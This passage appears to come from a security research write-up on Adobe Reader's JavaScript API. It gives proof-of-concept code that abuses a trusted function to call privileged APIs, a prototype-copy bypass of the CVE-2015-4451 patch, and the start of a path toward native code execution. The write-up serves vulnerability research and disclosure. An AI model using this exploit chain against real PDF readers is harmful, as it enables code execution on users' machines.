<!-- [Format Time: 0.0002 seconds] -->
<p>We create a new object named ‘fakeDoc’. We then set the member ‘displayText’ to reference some secured function we want to call. Then, we call ‘vulnerableFunc’ passing ‘fakeDoc’ as an argument.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c693ebde418824192" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
var vulnerableFunc = app.trustedFunction(function (doc) {
    app.beginPriv();
    doc.displayText("Hello, World!"); /* doc.displayText = doc.someSecuredFunction !! */
    app.endPriv();
});</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c693ebde418824192-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebde418824192-2">2</div><div class="crayon-num" data-line="crayon-5f694c693ebde418824192-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebde418824192-4">4</div><div class="crayon-num" data-line="crayon-5f694c693ebde418824192-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c693ebde418824192-1"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">vulnerableFunc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">app</span><span class="crayon-sy">.</span><span class="crayon-e">trustedFunction</span><span class="crayon-sy">(</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">doc</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebde418824192-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">app</span><span class="crayon-sy">.</span><span class="crayon-e">beginPriv</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694c693ebde418824192-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">doc</span><span class="crayon-sy">.</span><span class="crayon-e">displayText</span><span class="crayon-sy">(</span><span class="crayon-s">"Hello, World!"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">/* doc.displayText = doc.someSecuredFunction !! */</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebde418824192-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">app</span><span class="crayon-sy">.</span><span class="crayon-e">endPriv</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694c693ebde418824192-5"><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>The vulnerableFunc function then changes context to privileged, calling app.beginPriv. This is allowed since vulnerableFunc was previously defined as a trusted function (for instance, at Batch stage). It then calls doc.displayText, which, at this point, references the secured function someSecuredFunction. This will then trigger a call to that secured function, which is allowed since the context is now privileged.</p>
<p>In this example, we abused the fact that a trusted function receives a callback as an argument. But since JavaScript is a very dynamic language, there are many other cases in which callbacks are unintentionally called. Getters and setters functions can be defined, global variables can be overridden, and much more.</p>
<p>The approach Adobe takes to fix such vulnerabilities is to tweak the JavaScript engine to prevent specific behaviors. Examples include preventing the call to a privileged function from getters/setters, eval(), etc.</p>
<h3>ANSendApprovalToAuthorEnabled</h3>
<p>While manually auditing all the trusted functions, I came across the function that follows:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c693ebe0397904689" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
var ANSendApprovalToAuthorEnabled = app.trustedFunction(function (doc) {
    app.beginPriv();
    var hasAddr = doc.Collab.initiatorEmail;
    app.endPriv();
    return event.rc = doc &amp;&amp;
        hasAddr &amp;&amp;
        doc.requestPermission(permission.annot, permission.canExport) == permission.granted &amp;&amp;
        doc.requestPermission(permission.annot, permission.modify) == permission.granted;
});</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c693ebe0397904689-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe0397904689-2">2</div><div class="crayon-num" data-line="crayon-5f694c693ebe0397904689-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe0397904689-4">4</div><div class="crayon-num" data-line="crayon-5f694c693ebe0397904689-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe0397904689-6">6</div><div class="crayon-num" data-line="crayon-5f694c693ebe0397904689-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe0397904689-8">8</div><div class="crayon-num" data-line="crayon-5f694c693ebe0397904689-9">9</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c693ebe0397904689-1"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">ANSendApprovalToAuthorEnabled</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">app</span><span class="crayon-sy">.</span><span class="crayon-e">trustedFunction</span><span class="crayon-sy">(</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">doc</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe0397904689-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">app</span><span class="crayon-sy">.</span><span class="crayon-e">beginPriv</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694c693ebe0397904689-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">hasAddr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">doc</span><span class="crayon-sy">.</span><span class="crayon-v">Collab</span><span class="crayon-sy">.</span><span class="crayon-v">initiatorEmail</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe0397904689-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">app</span><span class="crayon-sy">.</span><span class="crayon-e">endPriv</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694c693ebe0397904689-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">event</span><span class="crayon-sy">.</span><span class="crayon-v">rc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">doc</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe0397904689-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">hasAddr</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span></div><div class="crayon-line" id="crayon-5f694c693ebe0397904689-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">doc</span><span class="crayon-sy">.</span><span class="crayon-e">requestPermission</span><span class="crayon-sy">(</span><span class="crayon-v">permission</span><span class="crayon-sy">.</span><span class="crayon-v">annot</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">permission</span><span class="crayon-sy">.</span><span class="crayon-v">canExport</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-v">permission</span><span class="crayon-sy">.</span><span class="crayon-v">granted</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe0397904689-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">doc</span><span class="crayon-sy">.</span><span class="crayon-e">requestPermission</span><span class="crayon-sy">(</span><span class="crayon-v">permission</span><span class="crayon-sy">.</span><span class="crayon-v">annot</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">permission</span><span class="crayon-sy">.</span><span class="crayon-v">modify</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-v">permission</span><span class="crayon-sy">.</span><span class="crayon-v">granted</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694c693ebe0397904689-9"><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->
<p>This seems like the perfect candidate for calling an arbitrary secured function. It takes doc as an argument and calls doc.requestPermission twice – which is fully controlled. The only thing is that doc.requestPermission isn’t called within the privileged portion of ANSendApprovalToAuthorEnabled (not between app.beginPriv/app.endPriv). This is very easy to bypass though; all you have to do is to set requestPermission to reference app.beginPriv, which will raise the privilege level.</p>
<p>To bypass the hasAddr condition, all we have to do is set doc.Collab.initiatorEmail to ‘true’. Note that we cannot execute privileged code from there since this isn’t a function call but a member reference.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c693ebe1001145818" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
var fakeDoc = {};
fakeDoc.__proto__ = app;
fakeDoc.Collab = {};
fakeDoc.Collab.initiatorEmail = true;
fakeDoc.requestPermission = app.beginPriv;
permission.granted.__defineGetter__(function() {
    fakeDoc.requestPermission = someSecuredFunction;
});
ANSendApprovalToAuthorEnabled(fakeDoc); </textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c693ebe1001145818-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe1001145818-2">2</div><div class="crayon-num" data-line="crayon-5f694c693ebe1001145818-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe1001145818-4">4</div><div class="crayon-num" data-line="crayon-5f694c693ebe1001145818-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe1001145818-6">6</div><div class="crayon-num" data-line="crayon-5f694c693ebe1001145818-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe1001145818-8">8</div><div class="crayon-num" data-line="crayon-5f694c693ebe1001145818-9">9</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c693ebe1001145818-1"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">fakeDoc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe1001145818-2"><span class="crayon-v">fakeDoc</span><span class="crayon-sy">.</span><span class="crayon-v">__proto__</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">app</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694c693ebe1001145818-3"><span class="crayon-v">fakeDoc</span><span class="crayon-sy">.</span><span class="crayon-v">Collab</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe1001145818-4"><span class="crayon-v">fakeDoc</span><span class="crayon-sy">.</span><span class="crayon-v">Collab</span><span class="crayon-sy">.</span><span class="crayon-v">initiatorEmail</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694c693ebe1001145818-5"><span class="crayon-v">fakeDoc</span><span class="crayon-sy">.</span><span class="crayon-v">requestPermission</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">app</span><span class="crayon-sy">.</span><span class="crayon-v">beginPriv</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe1001145818-6"><span class="crayon-v">permission</span><span class="crayon-sy">.</span><span class="crayon-v">granted</span><span class="crayon-sy">.</span><span class="crayon-e">__defineGetter__</span><span class="crayon-sy">(</span><span class="crayon-t">function</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694c693ebe1001145818-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">fakeDoc</span><span class="crayon-sy">.</span><span class="crayon-v">requestPermission</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">someSecuredFunction</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe1001145818-8"><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694c693ebe1001145818-9"><span class="crayon-e">ANSendApprovalToAuthorEnabled</span><span class="crayon-sy">(</span><span class="crayon-v">fakeDoc</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p>What happens then is the first call to doc.requestPermission is translated to a call to app.beginPriv that raises the context to privileged. Its return value is then compared to permisison.granted, which triggers the custom getter function I created. That function modifies fakeDoc.requestPermission to the secured function we want to call. ANSendApprovalToAuthorEnabled then calls doc.requestPermission again, this time calling an arbitrary secured function from privileged context.</p>
<p>When I investigated Adobe Reader, I didn’t review its latest version by mistake. After I upgraded it, I found out this vulnerability was patched and previously discovered by <a href="https://labs.mwrinfosecurity.com/assets/1008/original/mwri_advisory_javascript_privilege_escalation_in_adobe_reader.pdf">MWR Labs (CVE-2015-4451).</a></p>
<h3>CVE-2015-4451 Patch</h3>
<p>Still, the way my exploit failed surprised me. An exception was raised when I copied the reference to the app.beginPriv function into fakeDoc.requestPermission.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c693ebe3942814285" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
fakeDoc.requestPermission = app.beginPriv;
NotAllowedError: Security settings prevent access to this property or method.
App.beginPriv:9:Doc undefined:Open</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c693ebe3942814285-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe3942814285-2">2</div><div class="crayon-num" data-line="crayon-5f694c693ebe3942814285-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c693ebe3942814285-1"><span class="crayon-v">fakeDoc</span><span class="crayon-sy">.</span><span class="crayon-v">requestPermission</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">app</span><span class="crayon-sy">.</span><span class="crayon-v">beginPriv</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe3942814285-2"><span class="crayon-v">NotAllowedError</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Security </span><span class="crayon-e">settings </span><span class="crayon-e">prevent </span><span class="crayon-e">access </span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-h"> </span><span class="crayon-m">property</span><span class="crayon-h"> </span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-5f694c693ebe3942814285-3"><span class="crayon-v">App</span><span class="crayon-sy">.</span><span class="crayon-v">beginPriv</span><span class="crayon-o">:</span><span class="crayon-cn">9</span><span class="crayon-o">:</span><span class="crayon-e">Doc </span><span class="crayon-v">undefined</span><span class="crayon-o">:</span><span class="crayon-v">Open</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>This means that the way Adobe fixed the bug is by preventing attackers from copying a reference to app.beginPriv. Without a reference to that function, they are unable to raise the context to privileged, so they can only call an unsecured function that isn’t a threat. Besides that, the bug still exists. So if I can find an alternative way to gain a reference to app.beginPriv, this bug is still exploitable.</p>
<h3>JavaScript to the Rescue!</h3>
<p>I tried to find a creative way to abuse JavaScript into copying a reference to app.beginPriv, and I came up with the following solution:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c693ebe4143914553" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function get_beginPriv() {
	var myApp = {};
	myApp.__proto__ = app;
	return myApp.beginPriv;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c693ebe4143914553-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe4143914553-2">2</div><div class="crayon-num" data-line="crayon-5f694c693ebe4143914553-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebe4143914553-4">4</div><div class="crayon-num" data-line="crayon-5f694c693ebe4143914553-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c693ebe4143914553-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">get_beginPriv</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe4143914553-2"><span class="crayon-h">	</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">myApp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694c693ebe4143914553-3"><span class="crayon-h">	</span><span class="crayon-v">myApp</span><span class="crayon-sy">.</span><span class="crayon-v">__proto__</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">app</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebe4143914553-4"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">myApp</span><span class="crayon-sy">.</span><span class="crayon-v">beginPriv</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694c693ebe4143914553-5"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>Rather than copying a reference to app.beginPriv straight from the global app object, I copied its prototype into another newly created object. Copying the prototype of an object means to copy all of its members and methods. I then gained a reference to beginPriv from that copied instance, which Adobe didn’t prevent. This means I can still abuse ANSendApprovalToAuthorEnabled into executing an arbitrary secured function.</p>
<h3>Gaining Native Code Execution</h3>
<p>In their <a href="https://media.defcon.org/DEF%20CON%2023/DEF%20CON%2023%20presentations/DEFCON-23-Hariri-Spelman-Gorenc-Abusing-Adobe-Readers-JavaScript-APIs.pdf">presentation at DEFCON</a> 2015, the HP ZDI team showed how to abuse such vulnerabilities into native code execution. This is done using undocumented, secured APIs that allow writing files to the disk.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_4.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-20979" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_4.png" alt="zeroday_4" width="441" height="277" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_4.png 441w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_4-300x188.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_4-370x232.png 370w" sizes="(max-width: 441px) 100vw, 441px" /></a></p>
<p>The function Collab.uriPutData can be used to write arbitrary files to the disk. The only thing is that it executes from the rendered process of Adobe Reader, which, in turn, executes at a low integrity level. This means that the locations where you can write files to are very limited. The strategy described in ZDI’s presentation only works for Adobe Acrobat Pro edition, which does not use the sandbox. They used Collab.uriPutData to write a DLL to the disk and abuse a DLL-hijacking bug in Adobe Reader to load it.</p>
<p>I tried to take a different approach that would work for the free edition of Adobe Reader too.</p>
<h3>app.launchURL</h3>
<p>This is a secured function that launches the browser to a URL, supplied as an argument. By abusing the above privileged JavaScript vulnerability, an attacker can call it.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_5.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-20982" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_5.png" alt="zeroday_5" width="975" height="381" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_5.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_5-900x352.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_5-300x117.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_5-768x300.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_5-370x145.png 370w" sizes="(max-width: 975px) 100vw, 975px" /></a></p>
<p>Calling this function I found out it launches the default browser. So I was wondering how it knows which executable file to launch (chrome.exe, firefox.exe, iexplore.exe, or any other browser).</p>
